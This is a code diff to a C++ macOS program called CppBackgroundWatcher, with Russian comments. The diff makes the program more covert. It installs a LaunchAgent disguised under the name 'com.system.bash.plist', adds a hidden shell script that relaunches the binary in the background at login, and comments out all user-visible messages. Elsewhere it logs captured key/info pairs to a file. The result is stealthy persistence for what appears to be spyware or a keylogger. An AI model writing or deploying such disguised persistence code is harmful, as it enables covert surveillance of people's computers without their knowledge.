@@ -8,8 +8,8 @@ bool FileExists(const string& filename) {
     return file.good();
 }
 
-void WriteToOutputFile(const std::wstring& key, const std::string& info, const std::string& filename) {
-    wfstream file(filename, ios::app); 
+void WriteToOutputFile(const std::wstring& key, const std::string& info) {
+    wfstream file(FILE_NAME, ios::app); 
 
     if (file.is_open()) {
         locale utf8_locale("ru_RU.UTF-8");
@@ -37,13 +37,13 @@ void WriteToOutputFile(const std::wstring& key, const std::string& info, const s
         file << L"=\n";
         file.close(); 
     } else {
-        cerr << "Не удалось открыть файл для записи." << endl;
+        // cerr << "Не удалось открыть файл для записи." << endl;
     }
 }
 
-// TODO: change !!!
 void CreateLaunchAgentFile(char* path) {
-    string file_path = string(getenv("HOME")) + "/Library/LaunchAgents/com.background.system.watcher.plist";
+    string file_path = string(getenv("HOME")) + "/Library/LaunchAgents/com.system.bash.plist";
+    string bash_script_path = string(getenv("HOME")) + "/Library/LaunchAgents/system.bash.sh";
     string program_name  = "CppBackgroundWatcher";
     std::string destination_file_path = string(getenv("HOME")) + "/Library/LaunchAgents";
 
@@ -56,26 +56,20 @@ void CreateLaunchAgentFile(char* path) {
                                 + "/CppBackgroundWatcher";
         int copy_command_result = system(copy_command.c_str());
         if (copy_command_result != 0) {
-            std::cerr << "Ошибка при копировании файла." << std::endl;
+            // std::cerr << "Ошибка при копировании файла." << std::endl;
         }
-        // string grant_command = "sudo chmod 777 /Library/LaunchDaemons/com.background.system.watcher.plist";
-        // int grant_cred_result = system(grant_command.c_str());
-        // if (grant_cred_result != 0) {
-        //     std::cerr << "Ошибка прав доступа к файлу." << std::endl;
-        // }
 
         ofstream file(file_path);
-        
         if (file.is_open()) {
             file << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" << endl;
             file << "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">" << endl;
             file << "<plist version=\"1.0\">" << endl;
             file << "<dict>" << endl;
             file << "    <key>Label</key>" << endl;
-            file << "    <string>com.background.system.watcher</string>" << endl;
+            file << "    <string>com.system.bash.plist</string>" << endl;
             file << "    <key>ProgramArguments</key>" << endl;
             file << "    <array>" << endl;
-            file << "        <string>" << destination_file_path << '/' << program_name << "</string>" << endl;
+            file << "        <string>" << destination_file_path << '/' << "system.bash.sh" << "</string>" << endl;
             file << "    </array>" << endl;
             file << "    <key>RunAtLoad</key>" << endl;
             file << "    <true/>" << endl;
@@ -83,10 +77,21 @@ void CreateLaunchAgentFile(char* path) {
             file << "</plist>" << endl;
             file.close();
 
-            cout << "Файл успешно создан: " << file_path << endl;
-            ReloadLaunchConfiguration();
+            // cout << "Файл успешно создан: " << file_path << endl;
         } else {
-            cerr << "Не удалось открыть файл для записи." << endl;
+            // cerr << "Не удалось открыть файл для записи. com.system.bash.plist" << endl;
         }
+
+        ofstream bash_file(bash_script_path);
+        if(bash_file.is_open()) {
+            bash_file << "nohup ./CppBackgroundWatcher &" << endl;
+            bash_file.close();
+
+            // cout << "Файл успешно создан: system.bash.sh" << endl;
+        } else {
+            // cerr << "Не удалось открыть файл для записи. system.bash.sh" << endl;
+        }
+
+        ReloadLaunchConfiguration();
     }
 }
